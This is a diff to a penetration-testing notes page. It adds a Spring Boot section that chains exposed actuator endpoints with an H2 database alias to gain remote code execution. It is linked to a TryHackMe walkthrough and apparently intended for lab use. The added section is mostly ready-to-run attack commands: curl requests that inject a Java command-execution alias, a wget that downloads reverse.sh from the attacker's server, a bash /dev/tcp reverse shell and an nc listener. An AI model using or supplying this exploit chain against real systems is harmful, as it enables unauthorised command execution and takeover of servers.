@@ -1,7 +1,5 @@
 # Web
 
-
-
 ## Wordpress
 
 ### Reverse Shell #1 - Edit existing Plugin
@@ -82,6 +80,73 @@ s3cret
 <figure><img src="../../.gitbook/assets/image (284).png" alt=""><figcaption></figcaption></figure>
 
 
+
+## Spring Boot&#x20;
+
+### Reverse Shell
+
+**Examples**
+
+[#initial-shell](../../walkthroughs/tryhackme/spring.md#initial-shell "mention")
+
+**Exploit:** [https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database/](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database/)
+
+**Kali #1**
+
+```
+tcpdump -i ens5 icmp
+```
+
+Below example checks the IP which may not be necessary.&#x20;
+
+**Kali #2**
+
+<pre><code>curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' --data-binary $'{\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATE ALIAS EXEC AS CONCAT(\'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new\',\' java.util.Scanner(Runtime.getRun\',\'time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }\');CALL EXEC(\'ping -c 5 $KALI\');\"}' "https://$VICTIM/actuator/env" -k
+<strong>
+</strong>curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' "https://$VICTIM/actuator/restart" -k
+</code></pre>
+
+<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+
+**reverse.sh**
+
+```
+bash -c "bash -i >& /dev/tcp/$KALI/1337 0>&1"
+```
+
+**Kali #1**
+
+```
+python3 -m http.server 81
+```
+
+**Kali #2**
+
+```
+nc -lvnp 1337
+```
+
+Download payload
+
+**Kali #3**
+
+```
+curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' --data-binary $'{\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATE ALIAS EXEC AS CONCAT(\'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new\',\' java.util.Scanner(Runtime.getRun\',\'time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }\');CALL EXEC(\'wget http://$KALI:81/reverse.sh -O /tmp/reverse.sh\');\"}' "https://$VICTIM/actuator/env" -k
+
+curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' "https://$VICTIM/actuator/restart" -k
+```
+
+Run payload
+
+**Kali #3**
+
+```
+curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' --data-binary $'{\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATE ALIAS EXEC AS CONCAT(\'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new\',\' java.util.Scanner(Runtime.getRun\',\'time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }\');CALL EXEC(\'bash /tmp/reverse.sh\');\"}' "https://$VICTIM/actuator/env" -k
+
+curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' "https://$VICTIM/actuator/restart" -k
+```
+
+<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## See CMDS from page source
 
